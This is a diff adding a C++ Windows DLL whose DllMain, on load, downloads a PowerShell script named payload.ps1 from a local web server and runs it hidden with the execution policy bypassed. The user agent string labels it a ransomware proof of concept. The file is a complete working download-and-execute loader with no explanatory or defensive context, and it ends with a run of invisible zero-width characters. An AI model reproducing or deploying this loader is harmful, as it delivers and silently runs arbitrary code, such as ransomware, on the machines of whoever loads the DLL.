@@ -1,0 +1,38 @@
+
+#include <windows.h>
+#include <string>
+#include <wininet.h>
+#pragma comment(lib, "wininet.lib")
+
+void ExecutePayload() {
+  
+    HINTERNET hInternet = InternetOpenA("RansomwarePoC", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
+    if (!hInternet) return;
+
+    HINTERNET hConnect = InternetOpenUrlA(hInternet, "http://localhost:8000/payload.ps1", NULL, 0, INTERNET_FLAG_RELOAD, 0);
+    if (!hConnect) {
+        InternetCloseHandle(hInternet);
+        return;
+    }
+
+    char buffer[1024];
+    DWORD bytesRead;
+    std::string psCode;
+    while (InternetReadFile(hConnect, buffer, sizeof(buffer) - 1, &bytesRead) && bytesRead > 0) {
+        buffer[bytesRead] = '\0';
+        psCode += buffer;
+    }
+    InternetCloseHandle(hConnect);
+    InternetCloseHandle(hInternet);
+
+    std::string command = "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command \"" + psCode + "\"";
+    system(command.c_str());
+}
+
+BOOL APIENTRY DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
+    if (fdwReason == DLL_PROCESS_ATTACH) {
+        ExecutePayload();
+    }
+    return TRUE;
+}
+​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​
